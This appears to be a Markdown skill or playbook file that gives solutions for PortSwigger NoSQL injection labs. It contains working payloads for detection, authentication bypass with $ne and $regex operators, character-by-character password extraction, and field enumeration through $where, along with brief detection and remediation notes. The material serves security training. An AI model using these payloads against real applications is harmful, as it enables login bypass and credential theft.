---
name: "NoSQL Injection — Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# NoSQL Injection — Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Detecting NoSQLi 🟢 APPRENTICE
```
category=Gifts' && 0 && 'x
category=Gifts' && 1 && 'x
```
Different responses = NoSQL injection confirmed.
---

### Lab 2: Operator injection auth bypass 🟡 PRACTITIONER
```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
Or URL-encoded: `username[$ne]=invalid&password[$ne]=invalid`
---

### Lab 3: Extract data 🟡 PRACTITIONER
```json
{"username":"administrator","password":{"$regex":"^a.*"}}
```
Character-by-character extraction. `^a` = starts with 'a'. Iterate through alphabet.
---

### Lab 4: Extract unknown fields 🟡 PRACTITIONER
```json
{"username":"admin","password":{"$ne":""},"$where":"Object.keys(this)[2].match('^.{0}a.*')"}
```
Enumerate field names character by character using `$where` and `Object.keys()`.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
